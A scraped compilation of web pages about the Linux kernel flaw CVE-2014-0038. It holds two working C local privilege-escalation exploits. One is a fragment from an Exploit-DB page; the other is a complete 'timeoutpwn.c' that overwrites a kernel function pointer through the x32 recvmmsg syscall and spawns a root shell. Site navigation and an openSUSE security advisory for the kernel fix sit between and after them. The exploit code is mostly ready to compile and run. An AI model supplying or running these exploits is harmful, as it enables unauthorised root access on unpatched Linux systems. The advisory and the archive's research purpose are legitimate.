getroot(void *head, void * table)
{
    commit_creds(prepare_kernel_cred(0));
    return -1;
}

void __attribute__((regparm(3)))
trampoline()
{
    asm("mov $getroot, %rax; call *%rax;");
}

int main(void)
{
    int sockfd, retval, i;
    struct sockaddr_in sa;
    struct mmsghdr msgs[VLEN];
    struct iovec iovecs[VLEN];
    char buf[BUFSIZE];
    long mmapped;
    struct utsname u;
    struct offset *off = NULL;

    uname(&u);

    for(i=0;offsets[i].kernel_version != NULL;i++) {
        if(!strcmp(offsets[i].kernel_version,u.release)) {
            off = &offsets[i];
            break;
        }
    }

    if(!off) {
        fprintf(stderr,"no offsets for this kernel version..\n");
        exit(-1);
    }

    mmapped = (off->original_value  & ~(sysconf(_SC_PAGE_SIZE) - 1));
    mmapped &= 0x000000ffffffffff;

        srand(time(NULL));
    port = (rand() % 30000)+1500;

    commit_creds = (_commit_creds)off->commit_creds;
    prepare_kernel_cred = (_prepare_kernel_cred)off->prepare_kernel_cred;

    mmapped = (long)mmap((void *)mmapped, sysconf(_SC_PAGE_SIZE)*3, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, 0, 0);

    if(mmapped == -1) {
        perror("mmap()");
        exit(-1);
    }

    memset((char *)mmapped,0x90,sysconf(_SC_PAGE_SIZE)*3);

    memcpy((char *)mmapped + sysconf(_SC_PAGE_SIZE), (char *)&trampoline, 300);

    if(mprotect((void *)mmapped, sysconf(_SC_PAGE_SIZE)*3, PROT_READ|PROT_EXEC) != 0) {
        perror("mprotect()");
        exit(-1);
    }

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd == -1) {
        perror("socket()");
        exit(-1);
    }

    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    sa.sin_port = htons(port);

    if (bind(sockfd, (struct sockaddr *) &sa, sizeof(sa)) == -1) {
        perror("bind()");
        exit(-1);
    }

    memset(msgs, 0, sizeof(msgs));

    iovecs[0].iov_base = &buf;
    iovecs[0].iov_len = BUFSIZE;
    msgs[0].msg_hdr.msg_iov = &iovecs[0];
    msgs[0].msg_hdr.msg_iovlen = 1;

    for(i=0;i < 3 ;i++) {
        udp(i);
        retval = syscall(__NR_recvmmsg, sockfd, msgs, VLEN, 0, (void *)off->dest+7-i);
        if(!retval) {
            fprintf(stderr,"\nrecvmmsg() failed\n");
        }
    }

    close(sockfd);

    fprintf(stderr,"\n");

    trigger();
}

```

**Tags:**

[![](/screenshots/idlt31500/screen-shot-2014-02-02-at-40616-pm-thumb.png)](/screenshots/idlt31500/screen-shot-2014-02-02-at-40616-pm.png)

**Advisory/Source:**
Link

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Databases
[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links
[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites
[OffSec](https://www.offsec.com)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com)

Solutions
[Courses and Certifications](https://www.offsec.com/courses-and-certifications/)
[Learn Subscriptions](https://www.offsec.com/learn/)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/)
[Proving Grounds](https://www.offsec.com/labs/)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Close

##### OffSec Resources

×

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
|  | [Proving Grounds](https://www.offsec.com/labs/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/serchsploit) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Close

##### Search The Exploit Database

×

Title

CVE

Type

dos

local

remote

shellcode

papers

webapps

Platform

AIX

ASP

BSD

BSD\_PPC

BSD\_x86

BSDi\_x86

CGI

FreeBSD

FreeBSD\_x86

FreeBSD\_x86-64

Generator

Hardware

HP-UX

IRIX

JSP

Linux

Linux\_MIPS

Linux\_PPC

Linux\_SPARC

Linux\_x86

Linux\_x86-64

MINIX

Multiple

NetBSD\_x86

Novell

OpenBSD

OpenBSD\_x86

OSX\_PPC

OSX

PHP

Plan9

QNX

SCO

SCO\_x86

Solaris

Solaris\_SPARC

Solaris\_x86

Tru64

ULTRIX

Unix

UnixWare

Windows\_x86

Windows\_x86-64

Windows

ARM

CFM

Netware

SuperH\_SH4

Java

BeOS

Immunix

Palm\_OS

AtheOS

iOS

Android

XML

Perl

Python

System\_z

JSON

ASHX

Ruby

ASPX

macOS

Linux\_CRISv32

eZine

Magazine

NodeJS

Alpha

Solaris\_MIPS

Lua

watchOS

VxWorks

Python2

Python3

TypeScript

Go

Author

Content

Port

14

21

22

23

25

42

49

53

66

69

70

79

80

81

102

105

110

111

113

119

123

135

139

143

161

162

164

383

389

402

406

411

443

444

445

446

502

504

513

514

515

532

548

554

555

617

623

631

655

689

783

787

808

873

888

901

998

1000

1040

1089

1099

1100

1114

1120

1194

1235

1471

1521

1533

1581

1589

1604

1617

1723

1743

1761

1812

1858

1861

1900

1947

2000

2022

2049

2100

2103

2121

2125

2181

2242

2315

2375

2380

2381

2401

2480

2525

2640

2810

2812

2947

2954

2990

3000

3030

3050

3052

3128

3129

3181

3200

3217

3306

3333

3378

3389

3460

3465

3500

3535

3632

3690

3790

3814

3817

4000

4002

4070

4081

4105

4111

4322

4343

4434

4444

4501

4555

4592

4661

4750

4848

5000

5060

5061

5080

5081

5093

5151

5180

5247

5250

5272

5308

5432

5466

5554

5555

5600

5655

5666

5800

5803

5814

5858

5900

5984

6066

6070

6080

6082

6101

6112

6129

6379

6502

6503

6660

6667

7001

7002

7070

7071

7080

7100

7144

7210

7272

7290

7426

7443

7510

7547

7649

7770

7777

7778

7787

7879

7902

8000

8001

8002

8004

8008

8020

8022

8023

8028

8030

8080

8081

8082

8088

8090

8181

8300

8400

8443

8445

8473

8500

8585

8619

8800

8812

8839

8880

8888

9000

9001

9002

9080

9090

9091

9100

9124

9200

9251

9256

9443

9447

9784

9788

9855

9876

9900

9987

9993

9999

10000

10001

10080

10202

10203

10443

10616

11000

11211

11460

12203

12221

12345

12397

12401

13327

13701

13722

13838

16992

18821

18881

19000

19810

19813

20000

20002

20010

20031

20111

20171

22003

23423

25672

26000

27015

27700

28015

30000

30303

31337

32400

32674

32764

34205

37215

37777

37848

38292

40007

41523

44334

46824

48080

49152

50000

50496

52311

52789

52869

52986

53413

54345

54890

55554

55555

56380

57772

58080

62514

Tag

WordPress Core

Metasploit Framework (MSF)

WordPress Plugin

SQL Injection (SQLi)

Cross-Site Scripting (XSS)

File Inclusion (LFI/RFI)

Cross-Site Request Forgery (CSRF)

Denial of Service (DoS)

Code Injection

Command Injection

Authentication Bypass / Credentials Bypass (AB/CB)

Client Side

Use After Free (UAF)

Out Of Bounds

Remote

Local

XML External Entity (XXE)

Integer Overflow

Server-Side Request Forgery (SSRF)

Race Condition

NULL Pointer Dereference

Malware

Buffer Overflow

Heap Overflow

Type Confusion

Object Injection

Bug Report

Console

Pwn2Own

Traversal

Deserialization

Verified

Has App

No Metasploit

Search



=== Content from raw.github.com_60e97482_20250126_034947.html ===
/\*
\* Local root exploit for CVE-2014-0038.
\*
\* Bug: The X86\_X32 recvmmsg syscall does not properly sanitize the timeout pointer
\* passed from userspace.
\*
\* Exploit primitive: Pass a pointer to a kernel address as timeout for recvmmsg,
\* if the original byte at that address is known it can be overwritten
\* with known data.
\* If the least significant byte is 0xff, waiting 255 seconds will turn it into a 0x00.
\*
\* Restrictions: The first long at the passed address (tv\_sec) has to be positive
\* and the second long (tv\_nsec) has to be smaller than 1000000000.
\*
\* Overview: Target the release function pointer of the ptmx\_fops structure located in
\* non initialized (and thus writable) kernel memory. Zero out the three most
\* significant bytes and thus turn it into a pointer to an address mappable in
\* user space.
\* The release pointer is used as it is followed by 16 0x00 bytes (so the tv\_nsec
\* is valid).
\* Open /dev/ptmx, close it and enjoy.
\*
\* Not very beautiful but should be fairly reliable if symbols can be resolved.
\*
\* Tested on Ubuntu 13.10
\*
\* gcc timeoutpwn.c -o pwn && ./pwn
\*
\* Written by saelo
\*/
#define \_GNU\_SOURCE
#include
#include
#include
#include
#include
#include
#include
#include
#include
#include
#include
#include
#define \_\_X32\_SYSCALL\_BIT 0x40000000
#undef \_\_NR\_recvmmsg
#define \_\_NR\_recvmmsg (\_\_X32\_SYSCALL\_BIT + 537)
#define BUFSIZE 200
#define PAYLOADSIZE 0x2000
#define FOPS\_RELEASE\_OFFSET 13\*8
/\*
\* Adapt these addresses for your need.
\* see /boot/System.map\* or /proc/kallsyms
\* These are the offsets from ubuntu 3.11.0-12-generic.
\*/
#ifndef PTMX\_FOPS
#define PTMX\_FOPS 0xffffffff81fb30c0LL
#define TTY\_RELEASE 0xffffffff8142fec0LL
#define COMMIT\_CREDS 0xffffffff8108ad40LL
#define PREPARE\_KERNEL\_CRED 0xffffffff8108b010LL
#endif
typedef int \_\_attribute\_\_((regparm(3))) (\* \_commit\_creds)(unsigned long cred);
typedef unsigned long \_\_attribute\_\_((regparm(3))) (\* \_prepare\_kernel\_cred)(unsigned long cred);
/\*
\* Match signature of int release(struct inode\*, struct file\*).
\*
\* See here: http://grsecurity.net/~spender/exploits/enlightenment.tgz
\*/
int \_\_attribute\_\_((regparm(3)))
kernel\_payload(void\* foo, void\* bar)
{
\_commit\_creds commit\_creds = (\_commit\_creds)COMMIT\_CREDS;
\_prepare\_kernel\_cred prepare\_kernel\_cred = (\_prepare\_kernel\_cred)PREPARE\_KERNEL\_CRED;
/\* restore function pointer and following two longs \*/
\*((int\*)(PTMX\_FOPS + FOPS\_RELEASE\_OFFSET + 4)) = -1;
\*((long\*)(PTMX\_FOPS + FOPS\_RELEASE\_OFFSET + 8)) = 0;
\*((long\*)(PTMX\_FOPS + FOPS\_RELEASE\_OFFSET + 16)) = 0;
/\* escalate to root \*/
commit\_creds(prepare\_kernel\_cred(0));
return -1;
}
/\*
\* Write a zero to the byte at then given address.
\* Only works if the current value is 0xff.
\*/
void zero\_out(long addr)
{
int sockfd, retval, port, pid, i;
struct sockaddr\_in sa;
char buf[BUFSIZE];
struct mmsghdr msgs;
struct iovec iovecs;
srand(time(NULL));
port = 1024 + (rand() % (0x10000 - 1024));
sockfd = socket(AF\_INET, SOCK\_DGRAM, 0);
if (sockfd == -1) {
perror("socket()");
exit(EXIT\_FAILURE);
}
sa.sin\_family = AF\_INET;
sa.sin\_addr.s\_addr = htonl(INADDR\_LOOPBACK);
sa.sin\_port = htons(port);
if (bind(sockfd, (struct sockaddr \*) &sa, sizeof(sa)) == -1) {
perror("bind()");
exit(EXIT\_FAILURE);
}
memset(&msgs, 0, sizeof(msgs));
iovecs.iov\_base = buf;
iovecs.iov\_len = BUFSIZE;
msgs.msg\_hdr.msg\_iov = &iovecs
msgs.msg\_hdr.msg\_iovlen = 1;
/\*
\* start a seperate process to send a udp message after 255 seconds so the syscall returns,
\* but not after updating the timout struct and writing the remaining time into it.
\* 0xff - 255 seconds = 0x00
\*/
printf("clearing byte at 0x%lx\n", addr);
pid = fork();
if (pid == 0) {
memset(buf, 0x41, BUFSIZE);
if ((sockfd = socket(AF\_INET, SOCK\_DGRAM, IPPROTO\_UDP)) == -1) {
perror("socket()");
exit(EXIT\_FAILURE);
}
sa.sin\_family = AF\_INET;
sa.sin\_addr.s\_addr = htonl(INADDR\_LOOPBACK);
sa.sin\_port = htons(port);
sleep(0xfe);
printf("waking up parent...\n");
sendto(sockfd, buf, BUFSIZE, 0, &sa, sizeof(sa));
exit(EXIT\_SUCCESS);
} else if (pid > 0) {
retval = syscall(\_\_NR\_recvmmsg, sockfd, &msgs, 1, 0, (void\*)addr);
if (retval == -1) {
printf("address can't be written to, not a valid timespec struct!\n");
exit(EXIT\_FAILURE);
}
waitpid(pid, 0, 0);
printf("byte zeroed out\n");
} else {
perror("fork()");
exit(EXIT\_FAILURE);
}
}
int main(int argc, char\*\* argv)
{
long code, target;
int pwn, i, pids[3];
/\* Prepare payload... \*/
printf("preparing payload buffer...\n");
code = (long)mmap((void\*)(TTY\_RELEASE & 0x000000fffffff000LL), PAYLOADSIZE, 7, 0x32, 0, 0);
memset((void\*)code, 0x90, PAYLOADSIZE);
code += PAYLOADSIZE - 1024;
memcpy((void\*)code, &kernel\_payload, 1024);
/\*
\* Now clear the three most significant bytes of the fops pointer
\* to the release function.
\* This will make it point into the memory region mapped above.
\*/
printf("changing kernel pointer to point into controlled buffer...\n");
target = PTMX\_FOPS + FOPS\_RELEASE\_OFFSET;
for (i = 0; i < 3; i++) {
pids[i] = fork();
if (pids[i] == 0) {
zero\_out(target + (5 + i));
exit(EXIT\_SUCCESS);
}
sleep(1);
}
printf("waiting for timeouts...\n");
printf("0s/255s\n");
for (i = 10; i <= 250; i += 10) {
sleep(10);
printf("%is/255s\n", i);
}
for (i = 0; i < 3; i++) {
waitpid(pids[i], 0, 0);
}
/\* ... and trigger. \*/
printf("releasing file descriptor to call manipulated pointer in kernel mode...\n");
pwn = open("/dev/ptmx", 'r');
close(pwn);
if (getuid() != 0) {
printf("failed to get root :(\n");
exit(EXIT\_FAILURE);
}
printf("got root, enjoy :)\n");
return execl("/bin/bash", "-sh", NULL);
}


=== Content from lists.opensuse.org_59d93f50_20250124_220335.html ===


[![openSUSE](https://static.opensuse.org/favicon.svg)
Mailing Lists](/archives/ "openSUSE Mailing Lists")

[Sign In](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/S3Z5ZMLJMQRQPFMAXESRJNBNJMBGCZSK/)
[Sign Up](/accounts/signup/?next=/archives/list/security-announce%40lists.opensuse.org/message/S3Z5ZMLJMQRQPFMAXESRJNBNJMBGCZSK/)

[Manage this list](/manage/lists/security-announce.lists.opensuse.org/)
[Sign In](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/S3Z5ZMLJMQRQPFMAXESRJNBNJMBGCZSK/)
[Sign Up](/accounts/signup/?next=/archives/list/security-announce%40lists.opensuse.org/message/S3Z5ZMLJMQRQPFMAXESRJNBNJMBGCZSK/)

×
#### Keyboard Shortcuts

### Thread View

* `j`: Next unread message
* `k`: Previous unread message
* `j a`: Jump to all threads* `j l`: Jump to MailingList overview

[thread](/archives/list/security-announce%40lists.opensuse.org/thread/S3Z5ZMLJMQRQPFMAXESRJNBNJMBGCZSK/#S3Z5ZMLJMQRQPFMAXESRJNBNJMBGCZSK)

# [security-announce] openSUSE-SU-2014:0205-1: important: kernel to 3.11.10

![](https://seccdn.libravatar.org/avatar/099a17325bdf082b643d1a6bbacde279.jpg?s=120&d=mm&r=g)
## [opensuse-security＠opensuse.org](/archives/users/1b72def497ef4503896cd7a5fe9fb8e0/ "See the profile for opensuse-security＠opensuse.org")

6 Feb
2014

6 Feb
'14

18:21

openSUSE Security Update: kernel to 3.11.10
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
Announcement ID: openSUSE-SU-2014:0205-1
Rating: important
References: #733022 #773058 #838024 #844513 #845621 #846529
#848042 #849021 #850072 #852652 #852656 #852931
#853050 #853051 #853052 #853053 #854175 #854722
#856294 #859804 #860993
Cross-References: CVE-2013-4511 CVE-2013-4563 CVE-2013-4587
CVE-2013-6367 CVE-2013-6368 CVE-2013-6376
CVE-2013-6432 CVE-2014-0038
Affected Products:
openSUSE 13.1
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
An update that solves 8 vulnerabilities and has 13 fixes is
now available.
Description:
The Linux Kernel was updated to version 3.11.10, fixing
security issues and bugs:
- floppy: bail out in open() if drive is not responding to
block0 read (bnc#773058).
- compat\_sys\_recvmmsg X32 fix (bnc#860993 CVE-2014-0038).
- HID: usbhid: fix sis quirk (bnc#859804).
- hwmon: (coretemp) Fix truncated name of alarm attributes
- HID: usbhid: quirk for Synaptics Quad HD touchscreen
(bnc#859804).
- HID: usbhid: quirk for Synaptics HD touchscreen
(bnc#859804).
- HID: usbhid: merge the sis quirk (bnc#859804).
- HID: hid-multitouch: add support for SiS panels
(bnc#859804).
- HID: usbhid: quirk for SiS Touchscreen (bnc#859804).
- HID: usbhid: quirk for Synaptics Large Touchccreen
(bnc#859804).
- drivers: net: cpsw: fix dt probe for one port ethernet.
- drivers: net: cpsw: fix for cpsw crash when build as
modules.
- dma: edma: Remove limits on number of slots.
- dma: edma: Leave linked to Null slot instead of DUMMY
slot.
- dma: edma: Find missed events and issue them.
- dma: edma: Write out and handle MAX\_NR\_SG at a given time.
- dma: edma: Setup parameters to DMA MAX\_NR\_SG at a time.
- ARM: edma: Add function to manually trigger an EDMA
channel.
- ARM: edma: Fix clearing of unused list for DT DMA
resources.
- ACPI: Add Toshiba NB100 to Vista \_OSI blacklist.
- ACPI: add missing win8 OSI comment to blacklist
(bnc#856294).
- ACPI: update win8 OSI blacklist.
- ACPI: blacklist win8 OSI for buggy laptops.
- ACPI: blacklist win8 OSI for ASUS Zenbook Prime UX31A
(bnc#856294).
- ACPI: Blacklist Win8 OSI for some HP laptop 2013 models
(bnc#856294).
- floppy: bail out in open() if drive is not responding to
block0 read (bnc#773058).
- ping: prevent NULL pointer dereference on write to
msg\_name (bnc#854175 CVE-2013-6432).
- x86/dumpstack: Fix printk\_address for direct addresses
(bnc#845621).
- Refresh patches.suse/stack-unwind.
- Refresh patches.xen/xen-x86\_64-dump-user-pgt.
- KVM: x86: Convert vapic synchronization to \_cached
functions (CVE-2013-6368) (bnc#853052 CVE-2013-6368).
- KVM: x86: fix guest-initiated crash with x2apic
(CVE-2013-6376) (bnc#853053 CVE-2013-6376).
- Build the KOTD against openSUSE:13.1:Update
- xencons: generalize use of add\_preferred\_console()
(bnc#733022, bnc#852652).
- Update Xen patches to 3.11.10.
- Rename patches.xen/xen-pcpu-hotplug to
patches.xen/xen-pcpu.
- KVM: x86: Fix potential divide by 0 in lapic
(CVE-2013-6367) (bnc#853051 CVE-2013-6367).
- KVM: Improve create VCPU parameter (CVE-2013-4587)
(bnc#853050 CVE-2013-4587).
- ipv6: fix headroom calculation in udp6\_ufo\_fragment
(bnc#848042 CVE-2013-4563).
- net: rework recvmsg handler msg\_name and msg\_namelen
logic (bnc#854722).
- patches.drivers/gpio-ucb1400-add-module\_alias.patch:
Update upstream reference
-
patches.drivers/gpio-ucb1400-can-be-built-as-a-module.patch:
Update upstream reference
- Delete patches.suse/ida-remove-warning-dump-stack.patch.
Already included in kernel 3.11 (WARN calls dump\_stack.)
- xhci: Limit the spurious wakeup fix only to HP machines
(bnc#852931).
- iscsi\_target: race condition on shutdown (bnc#850072).
- Linux 3.11.10.
- Refresh patches.xen/xen3-patch-2.6.29.
- Delete
patches.suse/btrfs-relocate-csums-properly-with-prealloc-ext
ents.patch.
-
patches.drivers/xhci-Fix-spurious-wakeups-after-S5-on-Haswel
l.patch: (bnc#852931).
- Build mei and mei\_me as modules (bnc#852656)
- Linux 3.11.9.
- Linux 3.11.8 (CVE-2013-4511 bnc#846529 bnc#849021).
- Delete
patches.drivers/ALSA-hda-Add-a-fixup-for-ASUS-N76VZ.
- Delete
patches.fixes/Fix-a-few-incorrectly-checked-io\_-remap\_pfn\_ra
nge-ca.patch.
- Add USB PHY support (needed to get USB and Ethernet
working on beagle and panda boards) Add
CONFIG\_PINCTRL\_SINGLE=y to be able to use Device tree (at
least for beagle and panda boards) Add ARM SoC sound
support Add SPI bus support Add user-space access to I2C
and SPI
-
patches.arch/iommu-vt-d-remove-stack-trace-from-broken-irq-r
emapping-warning.patch: Fix forward porting, sorry.
- iommu: Remove stack trace from broken irq remapping
warning (bnc#844513).
- gpio: ucb1400: Add MODULE\_ALIAS.
- Allow NFSv4 username mapping to work properly
(bnc#838024).
- nfs: check if gssd is running before attempting to use
krb5i auth in SETCLIENTID call.
- sunrpc: replace sunrpc\_net->gssd\_running flag with a more
reliable check.
- sunrpc: create a new dummy pipe for gssd to hold open.
- Set CONFIG\_GPIO\_TWL4030 as built-in (instead of module)
as a requirement to boot on SD card on beagleboard xM
- armv6hl, armv7hl: Update config files. Set
CONFIG\_BATMAN\_ADV\_BLA=y as all other kernel configuration
files have.
- Update config files:
\* CONFIG\_BATMAN\_ADV\_NC=y, because other BATMAN\_ADV
options are all enabled so why not this one.
\* CONFIG\_GPIO\_SCH=m, CONFIG\_GPIO\_PCH=m, because we
support all other features of these pieces of hardware.
\* CONFIG\_INTEL\_POWERCLAMP=m, because this small driver
might be useful in specific cases, and there's no
obvious reason not to include it.
- Fix a few incorrectly checked [io\_]remap\_pfn\_range()
calls (bnc#849021, CVE-2013-4511).
- Linux 3.11.7.
Patch Instructions:
To install this openSUSE Security Update use YaST online\_update.
Alternatively you can run the command listed for your product:
- openSUSE 13.1:
zypper in -t patch openSUSE-2014-114
To bring your system up-to-date, use "zypper patch".
Package List:
- openSUSE 13.1 (i586 x86\_64):
kernel-default-3.11.10-7.1
kernel-default-base-3.11.10-7.1
kernel-default-base-debuginfo-3.11.10-7.1
kernel-default-debuginfo-3.11.10-7.1
kernel-default-debugsource-3.11.10-7.1
kernel-default-devel-3.11.10-7.1
kernel-default-devel-debuginfo-3.11.10-7.1
kernel-syms-3.11.10-7.1
- openSUSE 13.1 (i686 x86\_64):
kernel-debug-3.11.10-7.1
kernel-debug-base-3.11.10-7.1
kernel-debug-base-debuginfo-3.11.10-7.1
kernel-debug-debuginfo-3.11.10-7.1
kernel-debug-debugsource-3.11.10-7.1
kernel-debug-devel-3.11.10-7.1
kernel-debug-devel-debuginfo-3.11.10-7.1
kernel-desktop-3.11.10-7.1
kernel-desktop-base-3.11.10-7.1
kernel-desktop-base-debuginfo-3.11.10-7.1
kernel-desktop-debuginfo-3.11.10-7.1
kernel-desktop-debugsource-3.11.10-7.1
kernel-desktop-devel-3.11.10-7.1
kernel-desktop-devel-debuginfo-3.11.10-7.1
kernel-ec2-3.11.10-7.1
kernel-ec2-base-3.11.10-7.1
kernel-ec2-base-debuginfo-3.11.10-7.1
kernel-ec2-debuginfo-3.11.10-7.1
kernel-ec2-debugsource-3.11.10-7.1
kernel-ec2-devel-3.11.10-7.1
kernel-ec2-devel-debuginfo-3.11.10-7.1
kernel-trace-3.11.10-7.1
kernel-trace-base-3.11.10-7.1
kernel-trace-base-debuginfo-3.11.10-7.1
kernel-trace-debuginfo-3.11.10-7.1
kernel-trace-debugsource-3.11.10-7.1
kernel-trace-devel-3.11.10-7.1
kernel-trace-devel-debuginfo-3.11.10-7.1
kernel-vanilla-3.11.10-7.1
kernel-vanilla-debuginfo-3.11.10-7.1
kernel-vanilla-debugsource-3.11.10-7.1
kernel-vanilla-devel-3.11.10-7.1
kernel-vanilla-devel-debuginfo-3.11.10-7.1
kernel-xen-3.11.10-7.1
kernel-xen-base-3.11.10-7.1
kernel-xen-base-debuginfo-3.11.10-7.1
kernel-xen-debuginfo-3.11.10-7.1
kernel-xen-debugsource-3.11.10-7.1
kernel-xen-devel-3.11.10-7.1
kernel-xen-devel-debuginfo-3.11.10-7.1
- openSUSE 13.1 (noarch):
kernel-devel-3.11.10-7.1
kernel-docs-3.11.10-7.3
kernel-source-3.11.10-7.1
kernel-source-vanilla-3.11.10-7.1
- openSUSE 13.1 (i686):
kernel-pae-3.11.10-7.1
kernel-pae-base-3.11.10-7.1
kernel-pae-base-debuginfo-3.11.10-7.1
kernel-pae-debuginfo-3.11.10-7.1
kernel-pae-debugsource-3.11.10-7.1
kernel-pae-devel-3.11.10-7.1
kernel-pae-devel-debuginfo-3.11.10-7.1
References:
<http://support.novell.com/security/cve/CVE-2013-4511.html>
<http://support.novell.com/security/cve/CVE-2013-4563.html>
<http://support.novell.com/security/cve/CVE-2013-4587.html>
<http://support.novell.com/security/cve/CVE-2013-6367.html>
<http://support.novell.com/security/cve/CVE-2013-6368.html>
<http://support.novell.com/security/cve/CVE-2013-6376.html>
<http://support.novell.com/security/cve/CVE-2013-6432.html>
<http://support.novell.com/security/cve/CVE-2014-0038.html>
<https://bugzilla.novell.com/733022>
<https://bugzilla.novell.com/773058>
<https://bugzilla.novell.com/838024>
<https://bugzilla.novell.com/844513>
<https://bugzilla.novell.com/845621>
<https://bugzilla.novell.com/846529>
<https://bugzilla.novell.com/848042>
<https://bugzilla.novell.com/849021>
<https://bugzilla.novell.com/850072>
<https://bugzilla.novell.com/852652>
<https://bugzilla.novell.com/852656>
<https://bugzilla.novell.com/852931>
<https://bugzilla.novell.com/853050>
<https://bugzilla.novell.com/853051>
<https://bugzilla.novell.com/853052>
<https://bugzilla.novell.com/853053>
<https://bugzilla.novell.com/854175>
<https://bugzilla.novell.com/854722>
<https://bugzilla.novell.com/856294>
<https://bugzilla.novell.com/859804>
<https://bugzilla.novell.com/860993>
--
To unsubscribe, e-mail: opensuse-security-announce+unsubscribe@opensuse.org
For additional commands, e-mail: opensuse-security-announce+help@opensuse.org

[0](#like "You must be logged-in to vote.")
[0](#dislike "You must be logged-in to vote.")

Reply

[Sign in to reply online](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/S3Z5ZMLJMQRQPFMAXESRJNBNJMBGCZSK/)
Use email software

[Back to the thread](/archives/list/security-announce%40lists.opensuse.org/thread/S3Z5ZMLJMQRQPFMAXESRJNBNJMBGCZSK/#S3Z5ZMLJMQRQPFMAXESRJNBNJMBGCZSK)

[Back to the list](/archives/list/security-announce%40lists.opensuse.org/)

![HyperKitty](/static/hyperkitty/img/logo.png)
Powered by [HyperKitty](http://hyperkitty.readthedocs.org) version 1.3.12.



=== Content from pastebin.com_c3242eed_20250124_220335.html ===
/\*
\*=\*=\*=\*=\*=\*=\*=\*=\*=\*=\*=\*=\*=\*=\*=\*=\*=\*=\*=\*=\*=\*=\*=\*=\*=\*=\*=\*=\*=\*=\*
recvmmsg.c - linux 3.4+ local root (CONFIG\_X86\_X32=y)
